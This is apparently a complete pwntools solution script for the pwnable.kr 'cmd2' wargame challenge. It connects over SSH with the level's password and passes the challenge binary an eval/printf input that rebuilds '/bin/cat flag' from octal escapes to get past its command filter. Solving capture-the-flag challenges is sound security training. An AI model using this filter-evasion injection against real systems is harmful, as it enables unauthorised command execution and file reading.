from pwn import *

session = ssh('cmd2', 'pwnable.kr', port=2222, password='mommy now I get what PATH environment is for :)')

# Not sure if this is an intended solution, but if all I've got is
# shell built-ins, I can do this to bypass the filters...
io = session.process(['./cmd2', 'eval $(printf "%b%s%b%s %clag" "\\057" bin "\\057" cat f)'])
io.readline()
print(io.readline())
